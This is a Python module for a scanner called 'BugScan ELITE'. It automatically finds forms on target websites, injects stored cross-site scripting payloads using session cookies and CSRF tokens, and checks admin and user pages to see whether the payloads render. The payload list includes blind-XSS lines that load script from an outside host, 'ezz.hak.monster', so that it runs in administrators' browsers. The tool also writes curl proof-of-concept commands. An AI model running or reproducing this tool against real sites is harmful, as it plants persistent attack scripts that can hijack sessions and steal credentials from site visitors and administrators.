"""
BugScan ELITE — Stored XSS Engine
Injects payloads into forms/params, then checks secondary pages
for rendering. Handles comment sections, user profiles, contact forms,
search history, admin panels, and any other persistent injection points.
"""
import re, time, logging, uuid, urllib.parse, urllib.request, ssl, threading
from typing import List, Dict, Optional, Tuple

log = logging.getLogger("elite.stored_xss")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", headers=None, data=None, timeout=10, session_cookies=""):
    try:
        h = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }
        if session_cookies:
            h["Cookie"] = session_cookies
        if headers: h.update(headers)
        body = data.encode() if isinstance(data,str) else data
        req  = urllib.request.Request(url, data=body, headers=h, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, dict(r.headers), r.read(65536).decode("utf-8","ignore"), r.url
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read(4096).decode("utf-8","ignore"), url
        except: return e.code, {}, "", url
    except Exception as e:
        log.debug(f"req {url}: {e}")
        return None

# Unique marker per test run — easy to grep for in responses
def _marker(prefix="BSXSS"):
    return f"{prefix}{uuid.uuid4().hex[:8].upper()}"

# Payloads that work in different reflection contexts
import os as _os
_BXSS_HOST = _os.environ.get("BXSS_HOST","ezz.hak.monster")

STORED_PAYLOADS = [
    # Standard — works when reflected directly in HTML
    '<img src=x onerror=alert("{marker}")>',
    '<svg/onload=alert("{marker}")>',
    '<script>alert("{marker}")</script>',
    # Blind XSS — fires in admin panel even if we never see reflection
    f'"><script src=//{_BXSS_HOST}></script>',
    f"'><script src=//{_BXSS_HOST}></script>",
    f'--></tiTle></stYle></texTarea></scrIpt>"//' + f"'//><scrIpt src=https://{_BXSS_HOST}></scrIpt>",
    '<svg/onload=import("//' + _BXSS_HOST + '")>',
    # Attribute injection — works inside tag attributes
    '" onmouseover=alert("{marker}") x="',
    "' onfocus=alert('{marker}') autofocus '",
    # JSON context — works when reflected inside JSON in HTML
    '\\u003cimg src=x onerror=alert("{marker}")\\u003e',
    # Comment injection
    '--><img src=x onerror=alert("{marker}")><!--',
    # Template literal
    '${alert("{marker}")}',
]

# Where to look for reflected stored content
REFLECTION_PATHS = [
    "/", "/home", "/dashboard", "/profile", "/account", "/settings",
    "/admin", "/admin/comments", "/admin/users", "/admin/logs",
    "/comments", "/posts", "/messages", "/inbox", "/notifications",
    "/search", "/results", "/history", "/activity", "/feed",
    "/users", "/user/profile", "/user/settings",
    "/blog", "/forum", "/community", "/support", "/tickets",
    "/reviews", "/feedback", "/contact",
]

# Form field names that commonly store user input
INJECTABLE_FIELDS = [
    "comment", "message", "body", "content", "text", "description",
    "title", "name", "username", "display_name", "bio", "about",
    "note", "feedback", "review", "subject", "search", "query",
    "address", "company", "website", "url", "signature", "tag",
    "label", "category", "status", "reason", "phone",
]


class StoredXSSEngine:
    """
    Detects stored XSS by:
    1. Finding forms on the target
    2. Injecting unique-marker payloads
    3. Fetching reflection pages to check if payload rendered
    """

    def __init__(self, session_cookies: str = "", auth_headers: Dict = None,
                 timeout: int = 10):
        self.cookies  = session_cookies
        self.auth_h   = auth_headers or {}
        self.timeout  = timeout
        self._found   = {}   # marker → (inject_url, payload)
        self._lock    = threading.Lock()

    def _get(self, url):
        return _req(url, timeout=self.timeout, session_cookies=self.cookies)

    def _post(self, url, data: dict):
        body = urllib.parse.urlencode(data)
        hdrs = {"Content-Type":"application/x-www-form-urlencoded"}
        hdrs.update(self.auth_h)
        return _req(url, "POST", headers=hdrs, data=body,
                    timeout=self.timeout, session_cookies=self.cookies)

    def _post_json(self, url, data: dict):
        import json
        body = json.dumps(data)
        hdrs = {"Content-Type":"application/json"}
        hdrs.update(self.auth_h)
        return _req(url, "POST", headers=hdrs, data=body,
                    timeout=self.timeout, session_cookies=self.cookies)

    def _extract_forms(self, url: str, html: str) -> List[Dict]:
        """Extract forms from HTML with action, method, fields."""
        forms = []
        for fm in re.finditer(r'<form[^>]*>(.*?)</form>', html, re.S|re.I):
            form_html = fm.group(0)
            # Action
            action_m = re.search(r'action=["\']([^"\']*)["\']', form_html, re.I)
            action   = action_m.group(1) if action_m else url
            if not action.startswith("http"):
                action = urllib.parse.urljoin(url, action)
            # Method
            method_m = re.search(r'method=["\']([^"\']*)["\']', form_html, re.I)
            method   = method_m.group(1).upper() if method_m else "GET"
            # Fields
            fields = {}
            for inp in re.finditer(
                r'<input[^>]*name=["\']([^"\']*)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
                form_html, re.I
            ):
                fields[inp.group(1)] = inp.group(2) or ""
            for ta in re.finditer(r'<textarea[^>]*name=["\']([^"\']*)["\']', form_html, re.I):
                fields[ta.group(1)] = ""
            for sel in re.finditer(r'<select[^>]*name=["\']([^"\']*)["\']', form_html, re.I):
                fields[sel.group(1)] = ""
            # CSRF token
            csrf_m = re.search(
                r'<input[^>]*(?:name=["\'](?:csrf|_token|token|authenticity_token)["\'][^>]*value=["\']([^"\']+)["\']'
                r'|value=["\']([^"\']+)["\'][^>]*name=["\'](?:csrf|_token|token)["\'])',
                form_html, re.I
            )
            csrf = (csrf_m.group(1) or csrf_m.group(2)) if csrf_m else ""
            if csrf:
                for k in fields:
                    if "csrf" in k.lower() or "token" in k.lower():
                        fields[k] = csrf
            forms.append({"action":action,"method":method,"fields":fields})
        return forms

    def _check_reflected(self, marker: str, target_base: str) -> Optional[str]:
        """Check if marker appears in any reflection page."""
        for path in REFLECTION_PATHS:
            url = target_base.rstrip("/") + path
            r = self._get(url)
            if r and marker in r[2]:
                return url
        # Also check the root
        r = self._get(target_base)
        if r and marker in r[2]:
            return target_base
        return None

    def scan_url(self, url: str, target_base: str) -> List[Dict]:
        """Scan a single URL for stored XSS opportunities."""
        findings = []
        r = self._get(url)
        if not r: return findings
        status, hdrs, html, final_url = r
        if status >= 400: return findings
        if "text/html" not in hdrs.get("Content-Type",""):
            return findings

        forms = self._extract_forms(final_url, html)
        log.debug(f"[stored_xss] {url}: {len(forms)} forms")

        for form in forms:
            action = form["action"]
            method = form["method"]
            fields = dict(form["fields"])

            # Find injectable text fields
            injectable = [f for f in fields if any(
                kw in f.lower() for kw in INJECTABLE_FIELDS
            )]
            if not injectable:
                # Try all text-like fields anyway
                injectable = [f for f in fields
                              if "password" not in f.lower()
                              and "email" not in f.lower()
                              and f not in ("_token","csrf","authenticity_token")]

            for field in injectable[:3]:  # max 3 fields per form
                for payload_tpl in STORED_PAYLOADS[:4]:  # max 4 payloads
                    marker = _marker()
                    payload = payload_tpl.format(marker=marker)

                    # Inject into field
                    test_data = dict(fields)
                    test_data[field] = payload

                    # Fill required fields with dummy data
                    for k,v in test_data.items():
                        if not v and k != field:
                            if "email" in k.lower(): test_data[k] = "test@test.com"
                            elif "name" in k.lower(): test_data[k] = "testuser"
                            elif "pass" in k.lower(): test_data[k] = "Test1234!"
                            elif "phone" in k.lower(): test_data[k] = "5551234567"
                            else: test_data[k] = "test"

                    # Submit
                    try:
                        if method == "POST":
                            sr = self._post(action, test_data)
                        else:
                            qs  = urllib.parse.urlencode(test_data)
                            sr  = self._get(f"{action}?{qs}")
                    except Exception as e:
                        log.debug(f"submit {action}: {e}")
                        continue

                    if not sr: continue

                    # Small delay then check reflection pages
                    time.sleep(0.5)
                    reflected_at = self._check_reflected(marker, target_base)

                    if reflected_at:
                        log.info(f"[stored_xss] FOUND: {field} @ {action} → {reflected_at}")
                        findings.append({
                            "type":         "stored_xss",
                            "bug":          "xss",
                            "severity":     "critical",
                            "url":          action,
                            "name":         f"Stored XSS via '{field}' field",
                            "details": {
                                "param":           field,
                                "payload":         payload,
                                "inject_url":      action,
                                "reflect_url":     reflected_at,
                                "form_method":     method,
                                "description":     (
                                    f"Stored XSS found: injecting into '{field}' field at "
                                    f"{action} causes script execution when viewed at {reflected_at}."
                                ),
                                "poc": (
                                    f"# Step 1 — Inject payload\n"
                                    f"curl -X {method} '{action}' \\\n"
                                    f"  -d '{field}={urllib.parse.quote(payload)}'\n\n"
                                    f"# Step 2 — Trigger XSS\n"
                                    f"curl '{reflected_at}'"
                                ),
                                "impact":      "Stored XSS allows persistent script execution for every visitor — account takeover, credential theft, session hijacking at scale.",
                                "remediation": "HTML-encode all user input before storage and output. Implement strict Content-Security-Policy.",
                            },
                            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                        })
                        # Don't test more payloads on same field once confirmed
                        break

        return findings

    def scan_api_endpoints(self, endpoints: List[str], target_base: str) -> List[Dict]:
        """Test JSON API endpoints for stored XSS via body params."""
        findings = []
        # Find POST endpoints
        post_ends = [e for e in endpoints
                     if any(kw in e.lower() for kw in
                            ["/comment","/post","/message","/review","/feedback",
                             "/note","/ticket","/submit","/create","/update",
                             "/profile","/settings","/report"])]

        for url in post_ends[:20]:
            for field in ["comment","message","body","content","text","title","name","description"]:
                marker = _marker()
                payload = f'<img src=x onerror=alert("{marker}")>'
                data = {field: payload}

                try:
                    r = self._post_json(url, data)
                    if not r or r[0] >= 500: continue
                    time.sleep(0.3)
                    reflected_at = self._check_reflected(marker, target_base)
                    if reflected_at:
                        findings.append({
                            "type":     "stored_xss",
                            "bug":      "xss",
                            "severity": "critical",
                            "url":      url,
                            "name":     f"Stored XSS via API '{field}' field",
                            "details": {
                                "param":      field,
                                "payload":    payload,
                                "inject_url": url,
                                "reflect_url":reflected_at,
                                "poc": f'curl -X POST {url} -H "Content-Type: application/json" -d \'{{"{ field}":"{payload}"}}\'',
                                "impact":      "Persistent XSS via API — affects all users viewing this content",
                                "remediation": "Sanitize and encode all user-supplied content before storing and rendering.",
                            },
                            "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                        })
                        break
                except Exception as e:
                    log.debug(f"api stored xss {url}: {e}")

        return findings


def check_stored_xss(targets: List[str], endpoints: List[str],
                     session_cookies: str = "",
                     auth_headers: Dict = None) -> List[Dict]:
    """
    Main entry point. Scans all targets for stored XSS.
    targets: live host URLs
    endpoints: all discovered endpoints
    session_cookies: auth session for authenticated scanning
    """
    engine   = StoredXSSEngine(session_cookies, auth_headers)
    findings = []
    lock     = threading.Lock()

    # Determine target base for each host
    bases = list(set(
        f"{urllib.parse.urlparse(t).scheme}://{urllib.parse.urlparse(t).netloc}"
        for t in targets if t.startswith("http")
    ))

    # Scan pages that likely have input forms
    pages_to_scan = []
    for base in bases[:20]:
        for path in REFLECTION_PATHS[:15]:
            pages_to_scan.append((base + path, base))

    # Also scan discovered endpoints with forms
    for ep in endpoints[:100]:
        base = f"{urllib.parse.urlparse(ep).scheme}://{urllib.parse.urlparse(ep).netloc}"
        if base: pages_to_scan.append((ep, base))

    def _scan_page(args):
        url, base = args
        try:
            result = engine.scan_url(url, base)
            if result:
                with lock: findings.extend(result)
        except Exception as e:
            log.debug(f"stored xss page {url}: {e}")

    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as exe:
        exe.map(_scan_page, pages_to_scan[:150])

    # Also test API endpoints
    for base in bases[:10]:
        api_findings = engine.scan_api_endpoints(endpoints, base)
        findings.extend(api_findings)

    log.info(f"[stored_xss] complete: {len(findings)} findings")
    return findings
